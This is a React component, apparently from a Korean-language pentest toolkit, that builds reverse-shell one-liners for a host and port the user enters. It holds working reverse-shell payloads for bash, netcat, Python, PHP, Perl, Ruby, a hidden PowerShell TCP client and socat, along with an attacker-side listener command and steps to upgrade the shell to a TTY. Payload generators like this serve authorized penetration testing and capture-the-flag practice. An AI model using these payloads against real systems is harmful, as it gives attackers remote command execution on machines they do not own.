import { useState } from 'react'
import { DISCLAIMER, Note, Readout, TextInput } from './shared'

export function ReverseShellBuilder() {
  const [host, setHost] = useState('')
  const [port, setPort] = useState('')
  const h = host.trim() || '10.10.10.10'
  const p = port.trim() || '4444'

  const variants = [
    { label: 'Bash -i', code: `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
    { label: 'Bash (read/exec, /dev/tcp 없을 때)', code: `exec 5<>/dev/tcp/${h}/${p}; cat <&5 | while read line; do $line 2>&5 >&5; done` },
    { label: 'Netcat (-e 지원)', code: `nc -e /bin/sh ${h} ${p}` },
    { label: 'Netcat (-e 미지원, mkfifo)', code: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${h} ${p} > /tmp/f` },
    { label: 'Python3', code: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` },
    { label: 'PHP', code: `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
    { label: 'Perl', code: `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
    { label: 'Ruby', code: `ruby -rsocket -e 'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { label: 'PowerShell (Nishang TCP)', code: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
    { label: 'Socat', code: `socat TCP:${h}:${p} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane` },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="호스트" value={host} onChange={setHost} placeholder="10.10.10.10" />
      <TextInput label="포트" value={port} onChange={setPort} placeholder="4444" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">리스너 실행 (공격자 측)</strong>
        <Readout title="Netcat Listener" value={`nc -lvnp ${p}`} wrap="anywhere" />
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">역쉘 원라이너</strong>
        {variants.map((variant, index) => (
          <Readout key={index} title={variant.label} value={variant.code} wrap="anywhere" />
        ))}
      </div>

      <Note>TTY 업그레이드: python3 -c 'import pty; pty.spawn("/bin/bash")' 후 Ctrl+Z, stty raw -echo; fg, export TERM=xterm</Note>
    </div>
  )
}

export default ReverseShellBuilder
